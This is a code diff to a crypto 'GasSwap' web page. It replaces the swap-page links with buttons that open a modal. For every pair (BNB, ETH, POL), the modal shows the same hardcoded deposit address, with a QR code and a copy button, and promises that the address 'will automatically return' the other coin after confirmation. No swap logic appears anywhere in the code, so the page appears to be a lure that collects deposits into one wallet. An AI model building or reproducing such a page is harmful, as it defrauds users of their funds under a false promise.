@@ -46,13 +46,14 @@
 
 <!-- Swap Menu -->
 <section class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-6 gap-3 mb-8">
-  <a href="bnb_trx.html" class="text-center rounded-xl py-3 bg-emerald-500 text-slate-950 font-semibold">BNB → TRX</a>
+  <a href="#" id="swap-bnb-trx" class="text-center rounded-xl py-3 bg-emerald-500 text-slate-950 font-semibold">BNB → TRX</a>
   <span class="text-center rounded-xl py-3 bg-slate-800 text-slate-500 cursor-not-allowed">TRX → BNB</span>
-  <a href="bnb_eth.html" class="text-center rounded-xl py-3 bg-emerald-500/80 hover:bg-emerald-500 text-slate-950 font-semibold">BNB → ETH</a>
-  <a href="eth_bnb.html" class="text-center rounded-xl py-3 bg-emerald-500/80 hover:bg-emerald-500 text-slate-950 font-semibold">ETH → BNB</a>
-  <a href="bnb_pol.html" class="text-center rounded-xl py-3 bg-emerald-500/80 hover:bg-emerald-500 text-slate-950 font-semibold">BNB → POL</a>
-  <a href="pol_bnb.html" class="text-center rounded-xl py-3 bg-emerald-500/80 hover:bg-emerald-500 text-slate-950 font-semibold">POL → BNB</a>
+  <button data-type="bnb-eth" class="text-center rounded-xl py-3 bg-emerald-500/80 hover:bg-emerald-500 text-slate-950 font-semibold">BNB → ETH</button>
+  <button data-type="eth-bnb" class="text-center rounded-xl py-3 bg-emerald-500/80 hover:bg-emerald-500 text-slate-950 font-semibold">ETH → BNB</button>
+  <button data-type="bnb-pol" class="text-center rounded-xl py-3 bg-emerald-500/80 hover:bg-emerald-500 text-slate-950 font-semibold">BNB → POL</button>
+  <button data-type="pol-bnb" class="text-center rounded-xl py-3 bg-emerald-500/80 hover:bg-emerald-500 text-slate-950 font-semibold">POL → BNB</button>
 </section>
+
 
 
 
@@ -137,6 +138,19 @@
       </div>
     </section>
   </main>
+<!-- Popup Modal -->
+<div id="swapModal" class="hidden fixed inset-0 bg-black/70 flex items-center justify-center z-50">
+  <div class="bg-slate-900 border border-slate-700 rounded-2xl max-w-md w-[90%] p-6 text-center relative">
+    <button id="closeModal" class="absolute top-2 right-3 text-slate-400 hover:text-emerald-400 text-xl">✕</button>
+    <h2 id="modalTitle" class="text-xl font-bold mb-2"></h2>
+    <p id="modalDesc" class="text-slate-400 text-sm mb-4"></p>
+    <div class="text-xs text-slate-400 mb-2" id="modalDepositLabel"></div>
+    <code id="modalAddress" class="block text-emerald-300 break-all mb-3">0xDA1E8b362DDe013EA87Cf8984D64490c1900d231</code>
+    <button id="copyAddr" class="px-3 py-2 rounded-lg border border-slate-700 hover:bg-slate-800 text-sm mb-4">Copy Address</button>
+    <div id="modalQR" class="flex justify-center mb-4"></div>
+    <div id="explorerLinks" class="space-y-1 text-sm text-slate-400"></div>
+  </div>
+</div>
 
   <footer class="mt-10 py-10 text-center text-xs text-slate-500">
     © <span id="year"></span> GasSwap
@@ -490,6 +504,78 @@ document.addEventListener("DOMContentLoaded", async ()=>{
     await updateForms(sender,receiver);
   });
 });
+// === Modal logic ===
+const swapPairs = {
+  "bnb-eth": {
+    title: "BNB → ETH",
+    desc: "Send BNB (BSC) to the address below. The same address will automatically return ETH after confirmation.",
+    label: "Deposit Address (BSC)",
+    explorers: [
+      { name: "BscScan (Sender)", url: "https://bscscan.com/address/" },
+      { name: "Etherscan (Receiver)", url: "https://etherscan.io/address/" }
+    ]
+  },
+  "eth-bnb": {
+    title: "ETH → BNB",
+    desc: "Send ETH to the address below. The same address will automatically return BNB after confirmation.",
+    label: "Deposit Address (ETH)",
+    explorers: [
+      { name: "Etherscan (Sender)", url: "https://etherscan.io/address/" },
+      { name: "BscScan (Receiver)", url: "https://bscscan.com/address/" }
+    ]
+  },
+  "bnb-pol": {
+    title: "BNB → POL",
+    desc: "Send BNB (BSC) to the address below. The same address will automatically return POL after confirmation.",
+    label: "Deposit Address (BSC)",
+    explorers: [
+      { name: "BscScan (Sender)", url: "https://bscscan.com/address/" },
+      { name: "Polygonscan (Receiver)", url: "https://polygonscan.com/address/" }
+    ]
+  },
+  "pol-bnb": {
+    title: "POL → BNB",
+    desc: "Send POL (Polygon) to the address below. The same address will automatically return BNB after confirmation.",
+    label: "Deposit Address (Polygon)",
+    explorers: [
+      { name: "Polygonscan (Sender)", url: "https://polygonscan.com/address/" },
+      { name: "BscScan (Receiver)", url: "https://bscscan.com/address/" }
+    ]
+  }
+};
+
+const depositAddress = "0xDA1E8b362DDe013EA87Cf8984D64490c1900d231";
+const modal = $("#swapModal"), qrDiv = $("#modalQR");
+
+document.querySelectorAll("button[data-type]").forEach(btn => {
+  btn.addEventListener("click", () => {
+    const type = btn.dataset.type;
+    const data = swapPairs[type];
+    $("#modalTitle").textContent = data.title;
+    $("#modalDesc").textContent = data.desc;
+    $("#modalDepositLabel").textContent = data.label;
+    $("#modalAddress").textContent = depositAddress;
+    $("#explorerLinks").innerHTML = data.explorers
+      .map(e => `🔗 <a href="${e.url + depositAddress}" target="_blank" class="underline hover:text-emerald-300">${e.name}</a>`)
+      .join("<br>");
+    qrDiv.innerHTML = "";
+    new QRCode(qrDiv, { text: depositAddress, width: 140, height: 140, correctLevel: QRCode.CorrectLevel.M });
+    modal.classList.remove("hidden");
+  });
+});
+
+$("#closeModal").addEventListener("click", () => modal.classList.add("hidden"));
+modal.addEventListener("click", e => { if (e.target === modal) modal.classList.add("hidden"); });
+
+$("#copyAddr").addEventListener("click", async () => {
+  await navigator.clipboard.writeText(depositAddress);
+  const b = $("#copyAddr");
+  const old = b.textContent;
+  b.textContent = "Copied!";
+  b.classList.add("border-emerald-500");
+  setTimeout(() => { b.textContent = old; b.classList.remove("border-emerald-500"); }, 1500);
+});
+
   </script>
 </body>
 </html>
